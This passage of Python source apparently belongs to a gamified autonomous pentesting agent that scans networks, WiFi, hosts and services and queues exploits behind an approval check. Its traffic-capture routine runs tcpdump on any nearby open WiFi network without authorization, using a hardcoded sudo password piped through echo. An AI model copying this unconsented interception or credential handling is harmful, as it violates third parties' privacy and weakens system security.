                self.log_knowledge(
                    "service_version",
                    f"{ip}:{svc.get('port')}",
                    {"service": name, "version": version},
                    source="sentient",
                )

            # Check for known vulnerable versions
            if name in ("http", "https") and version:
                self.log_knowledge(
                    "web_service",
                    ip,
                    {"port": svc.get("port"), "version": version},
                    source="sentient",
                )

        # Log the device itself
        self.log_knowledge(
            "device",
            ip,
            {
                "hostname": device.get("hostname", ""),
                "type": device.get("device_type", "unknown"),
                "services": len(services),
            },
            source="sentient",
        )

    # ── Prompt Suggestions ────────────────────────────────────

    def get_prompt_suggestions(self) -> List[Dict[str, str]]:
        """Get contextual prompt suggestions based on current state."""
        suggestions = []

        # Always-available suggestions
        suggestions.extend([
            {"text": "Scan my network", "category": "recon", "icon": "radar"},
            {"text": "Show discovered devices", "category": "recon", "icon": "list"},
            {"text": "Generate network map", "category": "recon", "icon": "map"},
            {"text": "Check system health", "category": "system", "icon": "heart"},
            {"text": "List all agents", "category": "system", "icon": "users"},
        ])

        # Context-aware suggestions based on state
        if self._stats["devices_found"] > 0:
            suggestions.extend([
                {"text": "Pentest all discovered devices", "category": "pentest", "icon": "crosshair"},
                {"text": "Enumerate services on all targets", "category": "recon", "icon": "scan"},
                {"text": "Search for known CVEs", "category": "vuln", "icon": "bug"},
            ])

        if self._stats["vulns_found"] > 0:
            suggestions.extend([
                {"text": "Prioritize exploits by severity", "category": "exploit", "icon": "fire"},
                {"text": "Generate vulnerability report", "category": "report", "icon": "file"},
                {"text": "Show pending authorizations", "category": "tamagotchi", "icon": "shield"},
            ])

        pending = sum(1 for n in self._notifications if n.needs_auth and n.auth_status == AuthStatus.PENDING)
        if pending > 0:
            suggestions.append(
                {"text": f"Review {pending} pending authorization(s)", "category": "tamagotchi", "icon": "alert"}
            )

        # Knowledge-based suggestions
        knowledge_stats = self.get_knowledge_stats()
        if knowledge_stats:
            suggestions.append(
                {"text": "What do we know about [target]?", "category": "knowledge", "icon": "brain"}
            )

        return suggestions

    # ── Main Autonomous Loop ──────────────────────────────────

    async def start(self, scan_interval: int = 600):
        """Start the autonomous loop."""
        if self._running:
            return
        self._running = True
        self._paused = False
        self._state = TamaState.IDLE
        logger.info(f"Tamagotchi engine started (interval: {scan_interval}s)")
        self._loop_task = asyncio.create_task(self._autonomous_loop(scan_interval))

    async def stop(self):
        """Stop the autonomous loop."""
        self._running = False
        self._paused = False
        self._state = TamaState.SLEEPING
        if self._loop_task:
            self._loop_task.cancel()
            try:
                await self._loop_task
            except asyncio.CancelledError:
                pass
        if self._scan_task and not self._scan_task.done():
            self._scan_task.cancel()
            try:
                await self._scan_task
            except asyncio.CancelledError:
                pass
        await self._resume_ollama()
        self.save_state()
        logger.info("Tamagotchi engine stopped")

    def pause(self):
        """Pause the autonomous loop."""
        if self._running and not self._paused:
            self._paused = True
            self._state = TamaState.SLEEPING
            self._think("Paused by user")
            logger.info("Tamagotchi engine paused")

    def resume(self):
        """Resume the autonomous loop."""
        if self._running and self._paused:
            self._paused = False
            self._state = TamaState.IDLE
            self._think("Resumed by user")
            logger.info("Tamagotchi engine resumed")

    def _think(self, thought: str):
        """Record a thought and log it."""
        self._current_thought = thought
        self._thinking_log.append({
            "thought": thought,
            "state": self._state.value,
            "timestamp": time.time(),
        })
        if len(self._thinking_log) > 100:
            self._thinking_log = self._thinking_log[-100:]
        logger.info(f"[TAMA THINK] {thought}")

    async def _autonomous_loop(self, interval: int):
        """Main autonomous loop — follows user's route:
        1. Analyse all networks
        2. Get handshakes, tests, attacks
        3. Find open networks → analyse devices
        4. Exploit/gain access (main goals)
        5. Index everything, create reports
        """
        while self._running:
            try:
                # Wait if paused
                while self._paused and self._running:
                    await asyncio.sleep(1)
                if not self._running:
                    break

                from agents.sentient import get_sentient_engine
                sentient = get_sentient_engine()

                # ── Phase 1: Discover Networks ──
                self._current_phase = "network_discovery"
                self._state = TamaState.SCANNING
                self._think("Phase 1: Discovering all networks...")
                self._phase_progress = {"phase": "network_discovery", "progress": 0}

                await sentient._detect_our_interfaces()
                networks = await sentient._detect_local_networks()
                self._phase_progress = {"phase": "network_discovery", "networks": len(networks), "progress": 100}

                for cidr in networks:
                    if cidr not in sentient._networks:
                        sentient._networks[cidr] = Network(cidr=cidr)
                        self._think(f"Found network: {cidr}")
                        self.award_xp("new_network_mapped", detail=cidr)

                self._stats["networks_analyzed"] = len(networks)

                # ── Phase 2: WiFi Recon + Handshakes ──
                self._current_phase = "wifi_recon"
                self._think("Phase 2: WiFi reconnaissance and handshake capture...")
                self._phase_progress = {"phase": "wifi_recon", "progress": 0}

                wifi_aps = await sentient._scan_wifi()
                self._phase_progress = {"phase": "wifi_recon", "aps_found": len(wifi_aps), "progress": 50}

                # Analyze WiFi networks for open/weak
                open_aps = [a for a in wifi_aps if a.encryption == "off"]
                weak_aps = [a for a in wifi_aps if a.encryption == "on" and a.signal > -60]

                if open_aps:
                    self._stats["open_networks_found"] += len(open_aps)
                    for ap in open_aps:
                        self._think(f"OPEN NETWORK: {ap.ssid} ({ap.bssid}) — no encryption!")
                        self.create_notification(
                            NotificationType.ALERT,
                            f"Open WiFi: {ap.ssid}",
                            f"BSSID: {ap.bssid}, Signal: {ap.signal} dBm — NO ENCRYPTION",
                            severity="high",
                        )
                        self.award_xp("wifi_ap_found", detail=f"OPEN: {ap.ssid}")

                # Capture handshakes from open networks (auto-authorized, no auth needed)
                for ap in open_aps[:3]:  # Limit to 3 to avoid hanging
                    self._think(f"Capturing traffic from open network: {ap.ssid}...")
                    await self._capture_wifi_traffic(ap)

                for ap in weak_aps[:2]:
                    self._think(f"Testing weak network: {ap.ssid} (signal: {ap.signal})...")
                    await self._test_wifi_security(ap)

                self._phase_progress = {"phase": "wifi_recon", "progress": 100}

                # ── Phase 3: Host Discovery on All Networks ──
                self._current_phase = "host_discovery"
                self._think(f"Phase 3: Discovering hosts on {len(networks)} network(s)...")
                all_hosts = []
                for i, cidr in enumerate(networks):
                    self._phase_progress = {"phase": "host_discovery", "network": cidr, "progress": int((i/len(networks))*100)}
                    hosts = await sentient._scan_network_discovery(cidr)
                    all_hosts.extend(hosts)
                    self._think(f"Found {len(hosts)} hosts on {cidr}")

                self._stats["scans_run"] += 1
                self._streaks["scans"] = self._streaks.get("scans", 0) + 1
                self.award_xp("scan_complete", detail=f"{len(all_hosts)} hosts across {len(networks)} networks")

                # ── Phase 4: Service Detection (one host at a time) ──
                self._current_phase = "service_analysis"
                self._think(f"Phase 4: Analysing {len(all_hosts)} hosts for services...")
                new_devices = 0
                for i, host in enumerate(all_hosts):
                    if self._paused:
                        self._think("Paused during service analysis")
                        while self._paused and self._running:
                            await asyncio.sleep(1)

                    ip = host["ip"]
                    if ip in sentient._devices:
                        sentient._devices[ip].last_seen = time.time()
                        continue

                    self._phase_progress = {"phase": "service_analysis", "host": ip, "progress": int((i/len(all_hosts))*100), "total": len(all_hosts)}
                    self._think(f"Analysing {ip} ({i+1}/{len(all_hosts)})...")

                    services = await sentient._scan_service_detection(ip)
                    device = Device(
                        ip=ip,
                        hostname=host.get("hostname", ""),
                        services=services,
                    )
                    device.device_type = sentient._classify_device(device)
                    sentient._devices[ip] = device
                    new_devices += 1
                    self._stats["devices_found"] = len(sentient._devices)

                    # Learn from device immediately
                    self.learn_from_device(device.to_dict())

                    # Create notification for new device
                    self.create_notification(
                        NotificationType.NEW_DEVICE,
                        f"New device: {ip}",
                        f"Hostname: {device.hostname or 'unknown'}, "
                        f"Type: {device.device_type.value}, "
                        f"Services: {len(services)}",
                        target=ip,
                        severity="info",
                    )

                    # XP for each device
                    self.award_xp("device_discovered", detail=f"{ip} ({device.device_type.value})")

                    # ── Phase 5: Analyze services for vulns (per host) ──
                    await self._analyze_device_vulns(device)

                if new_devices > 0:
                    self._streaks["devices"] = self._streaks.get("devices", 0) + new_devices

                # ── Phase 6: OS Detection on first few hosts ──
                self._current_phase = "os_detection"
                for host in all_hosts[:5]:
                    ip = host["ip"]
                    if ip in sentient._devices and not sentient._devices[ip].os_guess:
                        self._think(f"Detecting OS on {ip}...")
                        os_guess = await sentient._scan_os_detection(ip)
                        if os_guess:
                            sentient._devices[ip].os_guess = os_guess
                            sentient._devices[ip].device_type = sentient._classify_device(sentient._devices[ip])

                # ── Phase 7: Build Topology ──
                self._current_phase = "topology"
                self._think("Building network topology...")
                sentient._build_topology()

                # ── Phase 8: Execute Authorized Exploits ──
                self._current_phase = "exploitation"
                authorized = [
                    t for t in self._exploit_queue
                    if t.auth_status == AuthStatus.APPROVED and not t.executed
                ]
                if authorized:
                    self._think(f"Executing {len(authorized)} authorized exploit(s)...")
                    self._state = TamaState.EXPLOITING
                else:
                    self._think("No authorized exploits pending.")

                # ── Phase 9: Generate Report ──
                self._current_phase = "reporting"
                self._think("Generating report...")
                await self._generate_report()

                # ── Phase 10: Persist & Idle ──
                self._current_phase = "idle"
                self._state = TamaState.IDLE
                self._think(f"Cycle complete. {self._stats['devices_found']} devices, {self._stats['vulns_found']} vulns, Level {self._level}.")
                self._phase_progress = {"phase": "idle", "progress": 100}
                self.save_state()

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Tamagotchi loop error: {e}", exc_info=True)
                self._state = TamaState.ALERT
                self._think(f"Error: {e}")

            # Wait between cycles (check for pause)
            for _ in range(interval):
                if self._paused or not self._running:
                    break
                await asyncio.sleep(1)

    # ── WiFi Traffic Capture ─────────────────────────────────

    async def _capture_wifi_traffic(self, ap):
        """Capture traffic from an open WiFi network (no auth needed — passive)."""
        try:
            iface = "wlxc4e984dfb30f"
            ssid_safe = (ap.ssid or "unknown").replace(" ", "_").replace("/", "_")[:20]
            outfile = f"/tmp/wifi_capture_{ssid_safe}_{int(time.time())}"
            # Passive capture — just listen, no injection
            cmd = (
                f"echo jetson | sudo -S timeout 30 tcpdump -i {iface} "
                f"-w {outfile}.pcap -c 500 "
                f"not arp and not multicast 2>/dev/null"
            )
            self._think(f"Passive capture on {ap.ssid or ap.bssid}...")
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            try:
                await asyncio.wait_for(proc.communicate(), timeout=35)
            except asyncio.TimeoutError:
                if proc.returncode is None:
                    proc.kill()
                    await proc.wait()

            # Check if we got a file
            import os
            pcap = f"{outfile}.pcap"
            if os.path.exists(pcap) and os.path.getsize(pcap) > 0:
                self._think(f"Captured traffic from {ap.ssid or ap.bssid}")
                self.log_knowledge("wifi_capture", ap.bssid, {
                    "ssid": ap.ssid, "signal": ap.signal, "pcap": pcap,
                    "size": os.path.getsize(pcap),
                }, source="passive_capture")
                self.award_xp("wifi_ap_found", detail=f"Capture: {ap.ssid}")
            else:
                self._think(f"No traffic captured from {ap.ssid or ap.bssid}")
        except Exception as e:
            logger.warning(f"WiFi capture failed: {e}")

    async def _test_wifi_security(self, ap):
        """Test WiFi network security (passive — check encryption, not crack)."""
        try:
            self._think(f"Testing security of {ap.ssid or ap.bssid}...")
            # Log encryption info
            self.log_knowledge("wifi_security", ap.bssid, {
                "ssid": ap.ssid,
                "encryption": ap.encryption,
                "signal": ap.signal,
                "channel": ap.channel,
                "risk": "open" if ap.encryption == "off" else "encrypted",
            }, source="security_test")

            if ap.encryption == "off":
                self._think(f"UNSECURED: {ap.ssid} — no encryption!")
                self._create_vuln_notification(ap.bssid.replace(":", ""), 0, "open_wifi", "high",
                    f"Open WiFi network: {ap.ssid} ({ap.bssid}) — no encryption, all traffic visible")
            else:
                self._think(f"Network {ap.ssid} uses {ap.encryption} encryption")
        except Exception as e:
            logger.warning(f"WiFi security test failed: {e}")

    # ── Per-Device Vulnerability Analysis ───────────────────

    async def _analyze_device_vulns(self, device):
        """Analyze a single device for vulnerabilities."""
        ip = device.ip
        hostname = device.hostname or ""
        dev_type = device.device_type.value
        vulns_on_device = 0

        for svc in device.services:
            port = svc.port
            name = svc.name.lower() if svc.name else ""
            version = svc.version or ""
            vuln_found = False
            severity = "info"

            # Telnet (plaintext)
            if name == "telnet" or port == 23:
                self._think(f"⚠️ Telnet on {ip}:{port} — plaintext, sniffable")
                self._create_vuln_notification(ip, port, "telnet_exposure", "high",
                    f"Telnet on {ip}:{port} — credentials in plaintext")
                vuln_found = True
                severity = "high"

            # FTP
            elif name == "ftp" or port == 21:
                self._think(f"FTP on {ip}:{port} — checking for anon access...")
                self._create_vuln_notification(ip, port, "ftp_anon", "medium",
                    f"FTP on {ip}:{port} — check anonymous login")
                vuln_found = True
                severity = "medium"

            # SSH
            elif name == "ssh" or port == 22:
                if version and "OpenSSH" in version:
                    try:
                        ver_num = float(version.split("p")[0].replace("OpenSSH_", ""))
                        if ver_num < 7.0:
                            self._think(f"⚠️ Outdated SSH on {ip}: {version}")
                            self._create_vuln_notification(ip, port, "outdated_ssh", "medium",
                                f"Outdated OpenSSH ({version}) on {ip}:{port}")
                            vuln_found = True
                            severity = "medium"
                    except (ValueError, IndexError):
                        pass

            # HTTP/HTTPS
            elif name in ("http", "https"):
                self.log_knowledge("web_service", f"{ip}:{port}",
                    {"service": name, "version": version, "hostname": hostname},
                    source="analysis")

            # SMB
            elif name in ("microsoft-ds", "netbios-ssn") or port in (445, 139):
                self._think(f"⚠️ SMB on {ip}:{port} — exploit target")
                self._create_vuln_notification(ip, port, "smb_exposed", "high",
                    f"SMB on {ip}:{port} — brute force or EternalBlue possible")
                vuln_found = True
                severity = "high"

            # Databases
            elif name in ("mysql", "postgresql", "ms-sql") or port in (3306, 5432, 1433):
                self._think(f"⚠️ Database exposed on {ip}:{port} ({name})")
                self._create_vuln_notification(ip, port, "db_exposed", "high",
                    f"Database {name} on {ip}:{port} — should not be accessible")
                vuln_found = True
                severity = "high"

            # Redis
            elif name == "redis" or port == 6379:
                self._think(f"⚠️ Redis on {ip}:{port} — possible unauth access")
                self._create_vuln_notification(ip, port, "redis_exposed", "high",
                    f"Redis on {ip}:{port} — may allow unauthenticated access")
                vuln_found = True
                severity = "high"

            # RDP
            elif name == "rdp" or port == 3389:
                self._think(f"RDP on {ip}:{port} — brute force target")
                self._create_vuln_notification(ip, port, "rdp_exposed", "medium",
                    f"RDP on {ip}:{port} — brute force or BlueKeep check")
                vuln_found = True
                severity = "medium"

            # SNMP
            elif name == "snmp" or port in (161, 162):
                self._think(f"⚠️ SNMP on {ip}:{port} — info leak possible")
                self._create_vuln_notification(ip, port, "snmp_exposed", "medium",
                    f"SNMP on {ip}:{port} — community strings may be default")
                vuln_found = True
                severity = "medium"

            # VNC
            elif name == "vnc" or port == 5900:
                self._think(f"⚠️ VNC on {ip}:{port} — unencrypted remote desktop")
                self._create_vuln_notification(ip, port, "vnc_exposed", "medium",
                    f"VNC on {ip}:{port} — unencrypted remote access")
                vuln_found = True
                severity = "medium"

            # Log knowledge for all services
            self.log_knowledge("service_analysis", f"{ip}:{port}",
                {"service": name, "version": version, "vuln": vuln_found, "severity": severity},
                source="tamagotchi_analysis")

            if vuln_found:
                self._stats["vulns_found"] += 1
                vulns_on_device += 1
                self.award_xp("vuln_found", detail=f"{ip}:{port} ({name})")

        if vulns_on_device == 0:
            self._think(f"Device {ip} ({hostname or dev_type}) — {len(device.services)} services, clean")

    # ── Report Generation ───────────────────────────────────

    async def _generate_report(self):
        """Generate a summary report of all findings."""
        try:
            from agents.sentient import get_sentient_engine
            sentient = get_sentient_engine()

            devices = sentient.get_devices()
            wifi_aps = sentient.get_wifi_aps()
            networks = sentient.get_networks()
            topology = sentient.get_topology()

            report = {
                "timestamp": time.time(),
                "summary": {
                    "total_devices": len(devices),
                    "total_wifi_aps": len(wifi_aps),
                    "total_networks": len(networks),
                    "vulns_found": self._stats["vulns_found"],
                    "open_networks": self._stats.get("open_networks_found", 0),
                    "handshakes": self._stats.get("handshakes_captured", 0),
                },
                "devices": [],
                "wifi_networks": [],
                "vulnerabilities": [],
                "topology": topology,
            }

            for dev in devices:
                dev_report = {
                    "ip": dev.get("ip"),
                    "hostname": dev.get("hostname", ""),
                    "type": dev.get("type", "unknown"),
                    "os": dev.get("os_guess", ""),
                    "services": [
                        {"port": s.get("port"), "name": s.get("name"), "version": s.get("version")}
                        for s in dev.get("services", [])
                    ],
                }
                report["devices"].append(dev_report)

            for ap in wifi_aps:
                report["wifi_networks"].append({
                    "ssid": ap.get("ssid"),
                    "bssid": ap.get("bssid"),
                    "signal": ap.get("signal"),
                    "encryption": ap.get("encryption"),
                    "channel": ap.get("channel"),
                })

            # Collect all vulns from notifications
            for n in self._notifications:
                if n.type == NotificationType.VULN_FOUND:
                    report["vulnerabilities"].append({
                        "target": n.target,
                        "title": n.title,
                        "message": n.message,
                        "severity": n.severity,
                    })

            self._reports.append(report)
            if len(self._reports) > 20:
                self._reports = self._reports[-20:]

            # Save report to disk
            report_file = self._data_dir / f"report_{int(time.time())}.json"
            try:
                with open(report_file, 'w') as f:
                    json.dump(report, f, indent=2)
                self._think(f"Report saved: {report_file.name}")
            except Exception as e:
                logger.error(f"Failed to save report: {e}")

        except Exception as e:
            logger.error(f"Report generation failed: {e}")

    # ── Data Access ───────────────────────────────────────────

    def get_notifications(
        self,
        status: Optional[AuthStatus] = None,
        limit: int = 50,
    ) -> List[Dict[str, Any]]:
        """Get notifications, optionally filtered by auth status."""
        notifs = self._notifications
        if status:
            notifs = [n for n in notifs if n.auth_status == status]
        return [n.to_dict() for n in notifs[-limit:]]

    def get_exploit_queue(self) -> List[Dict[str, Any]]:
        """Get prioritized exploit queue."""
        return [t.to_dict() for t in self.prioritize_exploits()]

    def get_crack_sessions(self) -> List[Dict[str, Any]]:
        """Get all cracking sessions."""
        return [c.to_dict() for c in self._crack_sessions]

    def clear_old_notifications(self, max_age_hours: int = 24):
        """Clear notifications older than max_age hours."""
        cutoff = time.time() - (max_age_hours * 3600)
        self._notifications = [
            n for n in self._notifications
            if n.created_at > cutoff
        ]

    # ── Event Log & Gamification Data ────────────────────────

    def get_event_log(self, limit: int = 100, event_type: Optional[str] = None) -> List[Dict]:
        """Get recent events (XP gains, achievements, penalties, level ups)."""
        log = self._event_log
        if event_type:
            log = [e for e in log if e.get("type") == event_type]
        return log[-limit:]

    def get_mistakes(self, limit: int = 50) -> List[Dict]:
        """Get recent mistakes for learning review."""
        return self._mistakes[-limit:]

    def get_gamification(self) -> Dict[str, Any]:
        """Get full gamification status."""
        return {
            "xp": self._xp,
            "level": self._level,
            "level_name": self._get_level_name(),
            "total_xp": self._total_xp,
            "xp_to_next": self._xp_to_next_level(),
            "xp_progress": round(self._xp_progress(), 3),
            "next_level_name": self.LEVEL_NAMES[min(self._level, len(self.LEVEL_NAMES)-1)],
            "achievements": [
                {**self.ACHIEVEMENTS[k], "key": k}
                for k in self._achievements
            ],
            "achievements_available": len(self.ACHIEVEMENTS),
            "streaks": self._streaks,
            "mistakes": self.get_learning_data(),
            "recent_events": self.get_event_log(20),
            "stats": self._stats,
        }


# ── Singleton ────────────────────────────────────────────────

_tamagotchi_engine: Optional[TamagotchiEngine] = None


def get_tamagotchi_engine() -> TamagotchiEngine:
    global _tamagotchi_engine
    if _tamagotchi_engine is None:
        _tamagotchi_engine = TamagotchiEngine()
    return _tamagotchi_engine
